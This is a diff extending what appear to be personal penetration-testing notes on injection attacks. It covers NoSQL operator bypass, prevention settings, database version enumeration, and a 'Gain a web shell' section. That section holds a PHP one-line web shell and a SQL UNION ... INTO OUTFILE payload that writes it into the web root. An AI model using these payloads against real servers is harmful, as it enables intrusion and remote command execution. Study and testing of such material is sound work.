@@ -44,3 +44,24 @@
     * Replace 'password123' with {$ne: ""}. This searches for a paired value that does equal " ". You can find passwords this way.
     * You can execute JavaScript as well. $where,mapReduce,$accumulator, and $function.
     * Characters like ' , ", ; , \ , () , [] , and {} can be used.
+### Prevention
+#
+* Validators
+* Disable server-side JavaScript with --noscripting on the CMD.
+* Disable security.javascriptEnabled on the config file.
+* **Principle of least priviledge** - only give apps the priviledges they need.
+
+### Enumerating the service
+#
+* @@version on Microsoft SQL server & MySQL
+* v$version for Oracle.
+
+### Gain a web shell
+#
+* <? system($_REQUEST['cmd']); ?>
+* Create a file onm the server with a nonexistant user:
+    * SELECT Password FROM Users WHERE Username='abc'
+      UNION SELECT "<? system($_REQUEST['cmd']); ?>"
+      INTO OUTFILE "/var/www/html/shell.php"
+    * Password is blank, so you can upload that cmd script then visit that scripts URL to execute it.
+        * http://www.example.com/shell.php?cmd=COMMAND
